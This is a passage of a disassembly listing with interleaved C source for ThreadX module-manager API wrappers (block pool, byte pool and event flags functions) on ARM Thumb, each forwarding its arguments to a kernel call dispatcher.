 80203f0:	00000004 	.word	0x00000004

080203f4 <_txe_block_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_prioritize(TX_BLOCK_POOL *pool_ptr)
{
 80203f4:	b590      	push	{r4, r7, lr}
 80203f6:	b085      	sub	sp, #20
 80203f8:	af00      	add	r7, sp, #0
 80203fa:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80203fc:	4b07      	ldr	r3, [pc, #28]	; (802041c <_txe_block_pool_prioritize+0x28>)
 80203fe:	f859 3003 	ldr.w	r3, [r9, r3]
 8020402:	681c      	ldr	r4, [r3, #0]
 8020404:	6879      	ldr	r1, [r7, #4]
 8020406:	2300      	movs	r3, #0
 8020408:	2200      	movs	r2, #0
 802040a:	2007      	movs	r0, #7
 802040c:	47a0      	blx	r4
 802040e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020410:	68fb      	ldr	r3, [r7, #12]
}
 8020412:	4618      	mov	r0, r3
 8020414:	3714      	adds	r7, #20
 8020416:	46bd      	mov	sp, r7
 8020418:	bd90      	pop	{r4, r7, pc}
 802041a:	bf00      	nop
 802041c:	00000004 	.word	0x00000004

08020420 <_txe_block_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_release(VOID *block_ptr)
{
 8020420:	b590      	push	{r4, r7, lr}
 8020422:	b085      	sub	sp, #20
 8020424:	af00      	add	r7, sp, #0
 8020426:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_RELEASE_CALL, (ALIGN_TYPE) block_ptr, 0, 0);
 8020428:	4b07      	ldr	r3, [pc, #28]	; (8020448 <_txe_block_release+0x28>)
 802042a:	f859 3003 	ldr.w	r3, [r9, r3]
 802042e:	681c      	ldr	r4, [r3, #0]
 8020430:	6879      	ldr	r1, [r7, #4]
 8020432:	2300      	movs	r3, #0
 8020434:	2200      	movs	r2, #0
 8020436:	2008      	movs	r0, #8
 8020438:	47a0      	blx	r4
 802043a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802043c:	68fb      	ldr	r3, [r7, #12]
}
 802043e:	4618      	mov	r0, r3
 8020440:	3714      	adds	r7, #20
 8020442:	46bd      	mov	sp, r7
 8020444:	bd90      	pop	{r4, r7, pc}
 8020446:	bf00      	nop
 8020448:	00000004 	.word	0x00000004

0802044c <_txe_byte_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_allocate(TX_BYTE_POOL *pool_ptr, VOID **memory_ptr, ULONG memory_size, ULONG wait_option)
{
 802044c:	b590      	push	{r4, r7, lr}
 802044e:	b089      	sub	sp, #36	; 0x24
 8020450:	af00      	add	r7, sp, #0
 8020452:	60f8      	str	r0, [r7, #12]
 8020454:	60b9      	str	r1, [r7, #8]
 8020456:	607a      	str	r2, [r7, #4]
 8020458:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) memory_size;
 802045a:	687b      	ldr	r3, [r7, #4]
 802045c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) wait_option;
 802045e:	683b      	ldr	r3, [r7, #0]
 8020460:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) memory_ptr, (ALIGN_TYPE) extra_parameters);
 8020462:	4b08      	ldr	r3, [pc, #32]	; (8020484 <_txe_byte_allocate+0x38>)
 8020464:	f859 3003 	ldr.w	r3, [r9, r3]
 8020468:	681c      	ldr	r4, [r3, #0]
 802046a:	68f9      	ldr	r1, [r7, #12]
 802046c:	68ba      	ldr	r2, [r7, #8]
 802046e:	f107 0314 	add.w	r3, r7, #20
 8020472:	2009      	movs	r0, #9
 8020474:	47a0      	blx	r4
 8020476:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020478:	69fb      	ldr	r3, [r7, #28]
}
 802047a:	4618      	mov	r0, r3
 802047c:	3724      	adds	r7, #36	; 0x24
 802047e:	46bd      	mov	sp, r7
 8020480:	bd90      	pop	{r4, r7, pc}
 8020482:	bf00      	nop
 8020484:	00000004 	.word	0x00000004

08020488 <_txe_byte_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_create(TX_BYTE_POOL *pool_ptr, CHAR *name_ptr, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 8020488:	b590      	push	{r4, r7, lr}
 802048a:	b089      	sub	sp, #36	; 0x24
 802048c:	af00      	add	r7, sp, #0
 802048e:	60f8      	str	r0, [r7, #12]
 8020490:	60b9      	str	r1, [r7, #8]
 8020492:	607a      	str	r2, [r7, #4]
 8020494:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) pool_start;
 8020496:	687b      	ldr	r3, [r7, #4]
 8020498:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) pool_size;
 802049a:	683b      	ldr	r3, [r7, #0]
 802049c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) pool_control_block_size;
 802049e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80204a0:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80204a2:	4b08      	ldr	r3, [pc, #32]	; (80204c4 <_txe_byte_pool_create+0x3c>)
 80204a4:	f859 3003 	ldr.w	r3, [r9, r3]
 80204a8:	681c      	ldr	r4, [r3, #0]
 80204aa:	68f9      	ldr	r1, [r7, #12]
 80204ac:	68ba      	ldr	r2, [r7, #8]
 80204ae:	f107 0310 	add.w	r3, r7, #16
 80204b2:	200a      	movs	r0, #10
 80204b4:	47a0      	blx	r4
 80204b6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80204b8:	69fb      	ldr	r3, [r7, #28]
}
 80204ba:	4618      	mov	r0, r3
 80204bc:	3724      	adds	r7, #36	; 0x24
 80204be:	46bd      	mov	sp, r7
 80204c0:	bd90      	pop	{r4, r7, pc}
 80204c2:	bf00      	nop
 80204c4:	00000004 	.word	0x00000004

080204c8 <_txe_byte_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_delete(TX_BYTE_POOL *pool_ptr)
{
 80204c8:	b590      	push	{r4, r7, lr}
 80204ca:	b085      	sub	sp, #20
 80204cc:	af00      	add	r7, sp, #0
 80204ce:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80204d0:	4b07      	ldr	r3, [pc, #28]	; (80204f0 <_txe_byte_pool_delete+0x28>)
 80204d2:	f859 3003 	ldr.w	r3, [r9, r3]
 80204d6:	681c      	ldr	r4, [r3, #0]
 80204d8:	6879      	ldr	r1, [r7, #4]
 80204da:	2300      	movs	r3, #0
 80204dc:	2200      	movs	r2, #0
 80204de:	200b      	movs	r0, #11
 80204e0:	47a0      	blx	r4
 80204e2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80204e4:	68fb      	ldr	r3, [r7, #12]
}
 80204e6:	4618      	mov	r0, r3
 80204e8:	3714      	adds	r7, #20
 80204ea:	46bd      	mov	sp, r7
 80204ec:	bd90      	pop	{r4, r7, pc}
 80204ee:	bf00      	nop
 80204f0:	00000004 	.word	0x00000004

080204f4 <_txe_byte_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_info_get(TX_BYTE_POOL *pool_ptr, CHAR **name, ULONG *available_bytes, ULONG *fragments, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BYTE_POOL **next_pool)
{
 80204f4:	b590      	push	{r4, r7, lr}
 80204f6:	b08b      	sub	sp, #44	; 0x2c
 80204f8:	af00      	add	r7, sp, #0
 80204fa:	60f8      	str	r0, [r7, #12]
 80204fc:	60b9      	str	r1, [r7, #8]
 80204fe:	607a      	str	r2, [r7, #4]
 8020500:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_bytes;
 8020502:	687b      	ldr	r3, [r7, #4]
 8020504:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) fragments;
 8020506:	683b      	ldr	r3, [r7, #0]
 8020508:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 802050a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 802050c:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 802050e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020510:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 8020512:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020514:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020516:	4b08      	ldr	r3, [pc, #32]	; (8020538 <_txe_byte_pool_info_get+0x44>)
 8020518:	f859 3003 	ldr.w	r3, [r9, r3]
 802051c:	681c      	ldr	r4, [r3, #0]
 802051e:	68f9      	ldr	r1, [r7, #12]
 8020520:	68ba      	ldr	r2, [r7, #8]
 8020522:	f107 0310 	add.w	r3, r7, #16
 8020526:	200c      	movs	r0, #12
 8020528:	47a0      	blx	r4
 802052a:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 802052c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802052e:	4618      	mov	r0, r3
 8020530:	372c      	adds	r7, #44	; 0x2c
 8020532:	46bd      	mov	sp, r7
 8020534:	bd90      	pop	{r4, r7, pc}
 8020536:	bf00      	nop
 8020538:	00000004 	.word	0x00000004

0802053c <_tx_byte_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_info_get(TX_BYTE_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 802053c:	b590      	push	{r4, r7, lr}
 802053e:	b08d      	sub	sp, #52	; 0x34
 8020540:	af00      	add	r7, sp, #0
 8020542:	60f8      	str	r0, [r7, #12]
 8020544:	60b9      	str	r1, [r7, #8]
 8020546:	607a      	str	r2, [r7, #4]
 8020548:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 802054a:	687b      	ldr	r3, [r7, #4]
 802054c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) fragments_searched;
 802054e:	683b      	ldr	r3, [r7, #0]
 8020550:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) merges;
 8020552:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020554:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) splits;
 8020556:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020558:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) suspensions;
 802055a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 802055c:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
 802055e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8020560:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 8020562:	4b08      	ldr	r3, [pc, #32]	; (8020584 <_tx_byte_pool_performance_info_get+0x48>)
 8020564:	f859 3003 	ldr.w	r3, [r9, r3]
 8020568:	681c      	ldr	r4, [r3, #0]
 802056a:	68f9      	ldr	r1, [r7, #12]
 802056c:	68ba      	ldr	r2, [r7, #8]
 802056e:	f107 0314 	add.w	r3, r7, #20
 8020572:	200d      	movs	r0, #13
 8020574:	47a0      	blx	r4
 8020576:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 8020578:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 802057a:	4618      	mov	r0, r3
 802057c:	3734      	adds	r7, #52	; 0x34
 802057e:	46bd      	mov	sp, r7
 8020580:	bd90      	pop	{r4, r7, pc}
 8020582:	bf00      	nop
 8020584:	00000004 	.word	0x00000004

08020588 <_tx_byte_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 8020588:	b590      	push	{r4, r7, lr}
 802058a:	b08b      	sub	sp, #44	; 0x2c
 802058c:	af00      	add	r7, sp, #0
 802058e:	60f8      	str	r0, [r7, #12]
 8020590:	60b9      	str	r1, [r7, #8]
 8020592:	607a      	str	r2, [r7, #4]
 8020594:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) fragments_searched;
 8020596:	687b      	ldr	r3, [r7, #4]
 8020598:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) merges;
 802059a:	683b      	ldr	r3, [r7, #0]
 802059c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) splits;
 802059e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80205a0:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspensions;
 80205a2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80205a4:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 80205a6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80205a8:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80205aa:	4b08      	ldr	r3, [pc, #32]	; (80205cc <_tx_byte_pool_performance_system_info_get+0x44>)
 80205ac:	f859 3003 	ldr.w	r3, [r9, r3]
 80205b0:	681c      	ldr	r4, [r3, #0]
 80205b2:	68f9      	ldr	r1, [r7, #12]
 80205b4:	68ba      	ldr	r2, [r7, #8]
 80205b6:	f107 0310 	add.w	r3, r7, #16
 80205ba:	200e      	movs	r0, #14
 80205bc:	47a0      	blx	r4
 80205be:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80205c0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80205c2:	4618      	mov	r0, r3
 80205c4:	372c      	adds	r7, #44	; 0x2c
 80205c6:	46bd      	mov	sp, r7
 80205c8:	bd90      	pop	{r4, r7, pc}
 80205ca:	bf00      	nop
 80205cc:	00000004 	.word	0x00000004

080205d0 <_txe_byte_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_prioritize(TX_BYTE_POOL *pool_ptr)
{
 80205d0:	b590      	push	{r4, r7, lr}
 80205d2:	b085      	sub	sp, #20
 80205d4:	af00      	add	r7, sp, #0
 80205d6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80205d8:	4b07      	ldr	r3, [pc, #28]	; (80205f8 <_txe_byte_pool_prioritize+0x28>)
 80205da:	f859 3003 	ldr.w	r3, [r9, r3]
 80205de:	681c      	ldr	r4, [r3, #0]
 80205e0:	6879      	ldr	r1, [r7, #4]
 80205e2:	2300      	movs	r3, #0
 80205e4:	2200      	movs	r2, #0
 80205e6:	200f      	movs	r0, #15
 80205e8:	47a0      	blx	r4
 80205ea:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80205ec:	68fb      	ldr	r3, [r7, #12]
}
 80205ee:	4618      	mov	r0, r3
 80205f0:	3714      	adds	r7, #20
 80205f2:	46bd      	mov	sp, r7
 80205f4:	bd90      	pop	{r4, r7, pc}
 80205f6:	bf00      	nop
 80205f8:	00000004 	.word	0x00000004

080205fc <_txe_byte_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_release(VOID *memory_ptr)
{
 80205fc:	b590      	push	{r4, r7, lr}
 80205fe:	b085      	sub	sp, #20
 8020600:	af00      	add	r7, sp, #0
 8020602:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_RELEASE_CALL, (ALIGN_TYPE) memory_ptr, 0, 0);
 8020604:	4b07      	ldr	r3, [pc, #28]	; (8020624 <_txe_byte_release+0x28>)
 8020606:	f859 3003 	ldr.w	r3, [r9, r3]
 802060a:	681c      	ldr	r4, [r3, #0]
 802060c:	6879      	ldr	r1, [r7, #4]
 802060e:	2300      	movs	r3, #0
 8020610:	2200      	movs	r2, #0
 8020612:	2010      	movs	r0, #16
 8020614:	47a0      	blx	r4
 8020616:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020618:	68fb      	ldr	r3, [r7, #12]
}
 802061a:	4618      	mov	r0, r3
 802061c:	3714      	adds	r7, #20
 802061e:	46bd      	mov	sp, r7
 8020620:	bd90      	pop	{r4, r7, pc}
 8020622:	bf00      	nop
 8020624:	00000004 	.word	0x00000004

08020628 <_txe_event_flags_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_create(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR *name_ptr, UINT event_control_block_size)
{
 8020628:	b590      	push	{r4, r7, lr}
 802062a:	b087      	sub	sp, #28
 802062c:	af00      	add	r7, sp, #0
 802062e:	60f8      	str	r0, [r7, #12]
 8020630:	60b9      	str	r1, [r7, #8]
 8020632:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_CREATE_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) event_control_block_size);
 8020634:	4b07      	ldr	r3, [pc, #28]	; (8020654 <_txe_event_flags_create+0x2c>)
 8020636:	f859 3003 	ldr.w	r3, [r9, r3]
 802063a:	681c      	ldr	r4, [r3, #0]
 802063c:	68f9      	ldr	r1, [r7, #12]
 802063e:	68ba      	ldr	r2, [r7, #8]
 8020640:	687b      	ldr	r3, [r7, #4]
 8020642:	2011      	movs	r0, #17
 8020644:	47a0      	blx	r4
 8020646:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020648:	697b      	ldr	r3, [r7, #20]
}
 802064a:	4618      	mov	r0, r3
 802064c:	371c      	adds	r7, #28
 802064e:	46bd      	mov	sp, r7
 8020650:	bd90      	pop	{r4, r7, pc}
 8020652:	bf00      	nop
 8020654:	00000004 	.word	0x00000004

08020658 <_txe_event_flags_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_delete(TX_EVENT_FLAGS_GROUP *group_ptr)
{
 8020658:	b590      	push	{r4, r7, lr}
 802065a:	b085      	sub	sp, #20
 802065c:	af00      	add	r7, sp, #0
 802065e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_DELETE_CALL, (ALIGN_TYPE) group_ptr, 0, 0);
 8020660:	4b07      	ldr	r3, [pc, #28]	; (8020680 <_txe_event_flags_delete+0x28>)
 8020662:	f859 3003 	ldr.w	r3, [r9, r3]
 8020666:	681c      	ldr	r4, [r3, #0]
 8020668:	6879      	ldr	r1, [r7, #4]
 802066a:	2300      	movs	r3, #0
 802066c:	2200      	movs	r2, #0
 802066e:	2012      	movs	r0, #18
 8020670:	47a0      	blx	r4
 8020672:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020674:	68fb      	ldr	r3, [r7, #12]
}
 8020676:	4618      	mov	r0, r3
 8020678:	3714      	adds	r7, #20
 802067a:	46bd      	mov	sp, r7
 802067c:	bd90      	pop	{r4, r7, pc}
 802067e:	bf00      	nop
 8020680:	00000004 	.word	0x00000004

08020684 <_txe_event_flags_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG requested_flags, UINT get_option, ULONG *actual_flags_ptr, ULONG wait_option)
{
 8020684:	b590      	push	{r4, r7, lr}
 8020686:	b089      	sub	sp, #36	; 0x24
 8020688:	af00      	add	r7, sp, #0
 802068a:	60f8      	str	r0, [r7, #12]
 802068c:	60b9      	str	r1, [r7, #8]
 802068e:	607a      	str	r2, [r7, #4]
 8020690:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) get_option;
 8020692:	687b      	ldr	r3, [r7, #4]
 8020694:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) actual_flags_ptr;
 8020696:	683b      	ldr	r3, [r7, #0]
 8020698:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) wait_option;
 802069a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 802069c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) requested_flags, (ALIGN_TYPE) extra_parameters);
 802069e:	4b08      	ldr	r3, [pc, #32]	; (80206c0 <_txe_event_flags_get+0x3c>)
 80206a0:	f859 3003 	ldr.w	r3, [r9, r3]
 80206a4:	681c      	ldr	r4, [r3, #0]
 80206a6:	68f9      	ldr	r1, [r7, #12]
 80206a8:	f107 0310 	add.w	r3, r7, #16
 80206ac:	68ba      	ldr	r2, [r7, #8]
 80206ae:	2013      	movs	r0, #19
 80206b0:	47a0      	blx	r4
 80206b2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80206b4:	69fb      	ldr	r3, [r7, #28]
}
 80206b6:	4618      	mov	r0, r3
 80206b8:	3724      	adds	r7, #36	; 0x24
 80206ba:	46bd      	mov	sp, r7
 80206bc:	bd90      	pop	{r4, r7, pc}
 80206be:	bf00      	nop
 80206c0:	00000004 	.word	0x00000004

080206c4 <_txe_event_flags_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR **name, ULONG *current_flags, TX_THREAD **first_suspended, ULONG *suspended_count, TX_EVENT_FLAGS_GROUP **next_group)
{
 80206c4:	b590      	push	{r4, r7, lr}
 80206c6:	b08b      	sub	sp, #44	; 0x2c
 80206c8:	af00      	add	r7, sp, #0
 80206ca:	60f8      	str	r0, [r7, #12]
 80206cc:	60b9      	str	r1, [r7, #8]
 80206ce:	607a      	str	r2, [r7, #4]
 80206d0:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_flags;
 80206d2:	687b      	ldr	r3, [r7, #4]
 80206d4:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 80206d6:	683b      	ldr	r3, [r7, #0]
 80206d8:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 80206da:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80206dc:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_group;
 80206de:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80206e0:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 80206e2:	4b08      	ldr	r3, [pc, #32]	; (8020704 <_txe_event_flags_info_get+0x40>)
 80206e4:	f859 3003 	ldr.w	r3, [r9, r3]
 80206e8:	681c      	ldr	r4, [r3, #0]
 80206ea:	68f9      	ldr	r1, [r7, #12]
 80206ec:	68ba      	ldr	r2, [r7, #8]
 80206ee:	f107 0314 	add.w	r3, r7, #20
 80206f2:	2014      	movs	r0, #20
 80206f4:	47a0      	blx	r4
 80206f6:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80206f8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80206fa:	4618      	mov	r0, r3
 80206fc:	372c      	adds	r7, #44	; 0x2c
 80206fe:	46bd      	mov	sp, r7
 8020700:	bd90      	pop	{r4, r7, pc}
 8020702:	bf00      	nop
 8020704:	00000004 	.word	0x00000004

08020708 <_tx_event_flags_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020708:	b590      	push	{r4, r7, lr}
 802070a:	b089      	sub	sp, #36	; 0x24
 802070c:	af00      	add	r7, sp, #0
 802070e:	60f8      	str	r0, [r7, #12]
 8020710:	60b9      	str	r1, [r7, #8]
 8020712:	607a      	str	r2, [r7, #4]
 8020714:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020716:	687b      	ldr	r3, [r7, #4]
 8020718:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 802071a:	683b      	ldr	r3, [r7, #0]
 802071c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 802071e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020720:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) sets, (ALIGN_TYPE) extra_parameters);
 8020722:	4b08      	ldr	r3, [pc, #32]	; (8020744 <_tx_event_flags_performance_info_get+0x3c>)
 8020724:	f859 3003 	ldr.w	r3, [r9, r3]
 8020728:	681c      	ldr	r4, [r3, #0]
 802072a:	68f9      	ldr	r1, [r7, #12]
 802072c:	68ba      	ldr	r2, [r7, #8]
 802072e:	f107 0310 	add.w	r3, r7, #16
 8020732:	2015      	movs	r0, #21
 8020734:	47a0      	blx	r4
 8020736:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020738:	69fb      	ldr	r3, [r7, #28]
}
 802073a:	4618      	mov	r0, r3
 802073c:	3724      	adds	r7, #36	; 0x24
 802073e:	46bd      	mov	sp, r7
 8020740:	bd90      	pop	{r4, r7, pc}
